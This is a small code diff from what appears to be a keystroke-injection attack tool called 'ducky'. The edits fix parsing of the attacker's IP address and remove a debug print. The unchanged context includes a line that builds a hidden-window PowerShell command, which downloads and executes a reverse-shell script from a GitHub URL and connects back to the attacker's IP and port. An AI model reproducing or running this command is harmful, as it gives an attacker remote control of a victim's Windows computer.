@@ -143,7 +143,7 @@ while not stop:
             attacker_port = options[0].split(":")[1]
             if attacker_ip.lower() == "localhost" or attacker_ip == "127.0.0.1":
                 if sys.platform[:5] == "linux" or sys.platform == "darwin":
-                    attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1]
+                    attacker_ip = os.popen("ip route").readlines()[1].strip().split("src ")[1].split(" ")[0]
                 elif sys.platform == "win32":
                     attacker_ip = os.popen("ipconfig").readlines()[0].strip().split(": ")[1]
                 else:
@@ -152,7 +152,6 @@ while not stop:
             commands = []
             commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + attacker_ip + "\\\"; $port=" + attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell).content\'")
             stdin = "; ".join(commands)
-            print(stdin)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
